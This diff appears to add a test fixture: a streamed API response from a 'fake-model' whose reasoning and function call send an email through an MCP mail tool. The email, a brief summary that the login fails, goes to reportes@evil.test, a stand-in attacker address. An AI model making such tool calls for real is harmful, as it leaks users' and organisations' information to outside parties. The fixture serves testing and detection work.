@@ -1,0 +1,27 @@
+event: response.created
+data: {"type": "response.created", "sequence_number": 0, "response": {"id": "resp_0af353b484d8488c99d4732a", "object": "response", "created_at": 0, "status": "in_progress", "model": "fake-model", "output": [], "error": null, "incomplete_details": null, "usage": null}}
+
+event: response.in_progress
+data: {"type": "response.in_progress", "sequence_number": 1, "response": {"id": "resp_0af353b484d8488c99d4732a", "object": "response", "created_at": 0, "status": "in_progress", "model": "fake-model", "output": [], "error": null, "incomplete_details": null, "usage": null}}
+
+event: response.output_item.added
+data: {"type": "response.output_item.added", "sequence_number": 2, "output_index": 0, "item": {"type": "reasoning", "thinking": "Hay que enviar el resumen.", "encrypted_content": "gAAAAB-probe", "status": "in_progress"}}
+
+event: response.output_item.done
+data: {"type": "response.output_item.done", "sequence_number": 3, "output_index": 0, "item": {"type": "reasoning", "thinking": "Hay que enviar el resumen.", "encrypted_content": "gAAAAB-probe"}}
+
+event: response.output_item.added
+data: {"type": "response.output_item.added", "sequence_number": 4, "output_index": 1, "item": {"type": "function_call", "id": "fc_fea165f993b74809", "status": "in_progress", "call_id": "call_93846694cb934117b159", "arguments": "", "namespace": "mcp__mail", "name": "send_email"}}
+
+event: response.function_call_arguments.delta
+data: {"type": "response.function_call_arguments.delta", "sequence_number": 5, "item_id": "fc_fea165f993b74809", "output_index": 1, "delta": "{\"to\": \"reportes@evil.test\", \"body\": \"Resumen: el login falla.\"}"}
+
+event: response.function_call_arguments.done
+data: {"type": "response.function_call_arguments.done", "sequence_number": 6, "item_id": "fc_fea165f993b74809", "output_index": 1, "arguments": "{\"to\": \"reportes@evil.test\", \"body\": \"Resumen: el login falla.\"}"}
+
+event: response.output_item.done
+data: {"type": "response.output_item.done", "sequence_number": 7, "output_index": 1, "item": {"type": "function_call", "id": "fc_fea165f993b74809", "status": "completed", "call_id": "call_93846694cb934117b159", "arguments": "{\"to\": \"reportes@evil.test\", \"body\": \"Resumen: el login falla.\"}", "namespace": "mcp__mail", "name": "send_email"}}
+
+event: response.completed
+data: {"type": "response.completed", "sequence_number": 8, "response": {"id": "resp_0af353b484d8488c99d4732a", "object": "response", "created_at": 0, "status": "completed", "model": "fake-model", "output": [{"type": "reasoning", "thinking": "Hay que enviar el resumen.", "encrypted_content": "gAAAAB-probe"}, {"type": "function_call", "id": "fc_fea165f993b74809", "status": "completed", "call_id": "call_93846694cb934117b159", "arguments": "{\"to\": \"reportes@evil.test\", \"body\": \"Resumen: el login falla.\"}", "namespace": "mcp__mail", "name": "send_email"}], "error": null, "incomplete_details": null, "usage": {"input_tokens": 10, "input_tokens_details": {"cached_tokens": 0}, "output_tokens": 5, "output_tokens_details": {"reasoning_tokens": 0}, "total_tokens": 15}}}
+
